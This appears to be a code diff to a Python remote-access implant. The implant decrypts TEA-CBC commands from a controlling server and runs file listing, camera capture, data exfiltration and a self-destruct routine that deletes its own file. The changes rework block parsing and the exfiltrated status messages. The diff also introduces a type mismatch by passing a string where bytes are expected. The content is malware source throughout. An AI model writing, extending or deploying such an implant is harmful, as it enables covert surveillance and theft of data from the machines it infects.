@@ -35,15 +35,16 @@ def cbc(ciphertext: bytes) -> str:
     Returns plaintext as string after TEA CBC
     Param ciphertext: bytes representation of ciphertext from server through socket
     """
+    bn = int(len(ciphertext) / 8) # number of cipher blocks + 1 for IV
     plain = []
     blocks = []
-    for x in range(0,9): # split received data into blocks, block 0 is the IV
+    for x in range(0,bn): # split received data into blocks, block 0 is the IV
         blocks.append([int.from_bytes(ciphertext[8*x:8*x+4], 'big'), int.from_bytes(ciphertext[8*x+4:8*x+8], 'big')])
-    for x in range(1,9): # decrypt blocks
+    for x in range(1,bn): # decrypt blocks
         prexor = decrypt(blocks[x])
         plain.append([prexor[0] ^ blocks[x-1][0], prexor[1] ^ blocks[x-1][1]]) # xor with previous or IV and add to plaintext list
     out = ""
-    for x in range(0,8): # construct plaintext string
+    for x in range(0,bn-1): # construct plaintext string
         out += plain[x][0].to_bytes(4, 'big').decode() + plain[x][1].to_bytes(4, 'big').decode()
     return out
 
@@ -56,9 +57,9 @@ def parsecmd(enccmd: bytes) -> list[str]:
     cmdarr = cmd.split(":") # : is the separator we use in the server
     ct = cmdarr[0] # command type
     if len(cmdarr) > 1:
-        cp = cmdarr[1] # command parameter
+        cp = cmdarr[1] # command parameter, can be padding if no parameter is given
     else:
-        cp = "" # if there is no command parameter we use an empty string
+        cp = "" # if there is no command parameter and no padding
     return [ct, cp]
 
 def execcmd(cmd: list[str]):
@@ -80,10 +81,10 @@ def execcmd(cmd: list[str]):
         cam()
     elif ct == "sd": # self destruct
         sd()
-    elif ct == "stat": # exfiltrate success status
-        exfil(bytes([1]))
+    elif ct == "stat": # exfiltrate echo of command parameter
+        exfil(cp.encode())
     else: # exfiltrate failure status
-        exfil(bytes([0]))
+        exfil("failure".encode())
 
 def ls(cp: str):
     """
@@ -137,7 +138,7 @@ def sd():
     """
     Exfiltrates self destruct status and then deletes this file
     """
-    exfil(bytes([2])) # exfiltrate self destruct status
+    exfil("self destruct") # exfiltrate self destruct status
     subprocess.run(["rm", __file__])
 
 def exfil(info: bytes): # TODO
